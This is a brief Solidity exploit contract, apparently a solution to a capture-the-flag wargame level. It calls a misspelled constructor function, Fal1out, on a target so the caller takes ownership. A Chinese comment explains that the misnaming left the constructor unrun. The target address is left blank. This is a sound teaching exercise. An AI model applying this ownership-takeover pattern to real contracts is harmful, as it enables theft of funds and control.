// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Instance {
  
  function Fal1out() external payable;
}

contract Attack {
    
    Instance instance = Instance();

    constructor() {
      
        instance.Fal1out();
    }
}

/**
 * Fallout拼错了，没有运行构造函数
 */